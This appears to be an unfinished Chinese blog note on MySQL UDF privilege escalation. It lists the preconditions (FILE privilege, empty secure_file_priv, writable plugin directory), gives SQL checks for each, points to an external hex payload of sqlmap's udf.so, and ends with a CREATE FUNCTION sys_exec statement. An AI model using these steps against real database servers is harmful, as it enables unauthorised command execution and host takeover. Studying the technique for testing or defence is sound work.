mysql udf提权

占个坑，后续补上..

# 前提

  • mysql有FILE权限
  • secure_file_priv为空
  • 插件目录可写

FILE权限验证：

SELECT 'test' INTO OUTFILE '/tmp/test.txt';
1

secure_file_priv验证：

SHOW VARIABLES LIKE 'secure_file_priv';
1

插件目录验证：

# 任选一条，查询mysql插件目录位置
SELECT @@plugin_dir;
SELECT @@GLOBAL.plugin_dir;
SHOW VARIABLES LIKE 'plugin_dir';
SELECT * FROM performance_schema.global_variables WHERE VARIABLE_NAME = 'plugin_dir';

替换为上面查询到的实际插件路径

SELECT 'test' INTO DUMPFILE '/usr/lib/mysql/plugin/test.txt';

# UDF提权步骤

这里有别人导出sqlmap的udf.so的16进制写入payload，【MySQL UDF 提权十六进制查询】 (opens new window)

mysql创建udf函数：

CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
